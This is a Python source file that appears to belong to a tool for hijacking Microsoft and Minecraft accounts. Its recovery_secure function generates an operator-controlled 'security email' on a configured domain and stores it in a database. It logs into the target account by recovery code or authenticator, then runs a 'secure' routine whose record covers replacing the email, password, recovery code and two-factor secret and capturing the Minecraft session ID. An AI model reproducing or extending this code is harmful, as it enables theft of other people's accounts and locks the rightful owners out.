from securing.utils.login_authenticator import login_authenticator
from securing.build_embeds import build_account_embeds
from securing.auth.initial_session import get_session
from securing.utils.secure import secure

from database.database import DBConnection
from time import time
import logging
import json
import uuid

config = json.load(open("config/config.json", "r"))

async def recovery_secure(email: str, type: str, data: dict) -> dict:

    session = get_session()

    account = {
        "microsoft": {
            "email": "Couldn't Change!",
            "security_email": "Couldn't Change!",
            "password": "Couldn't Change!",
            "recovery_code": "Couldn't Change!",
            "auth_secret": "Disabled",
            "firstName": "Failed to Get",
            "lastName": "Failed to Get",
            "fullName": "Failed to Get",
            "region": "Failed to Get",
            "birthday": "Failed to Get"
        },
        "minecraft": {
            "name": "No Minecraft",
            "method": "Not purchased",
            "gamertag": "Not Found",
            "uchange": "0 Days",
            "capes": "No capes",
            "SSID": False
        }
    }

    sname = uuid.uuid4().hex[:16]
    password = uuid.uuid4().hex[:12]

    security_email = f"{sname}@{config["domain"]}"
    print(f"[+] - Generated Security Email ({security_email})")

    with DBConnection() as database:
        database.add_security_email(security_email, password)

    initialTime = time()
    print("[~] - Logging in session...")

    # Logs in depending on type
    match type:
        case "rcode":
            pass
        case "authpwd":
            await login_authenticator(
                session = session,
                email = email,
                data = data
            )

    dsecured = await secure(session, True, account)
    logging.info(f"Account: {dsecured}")

    final_time = (time() - initialTime)

    build_account = await build_account_embeds(dsecured, final_time)
    return build_account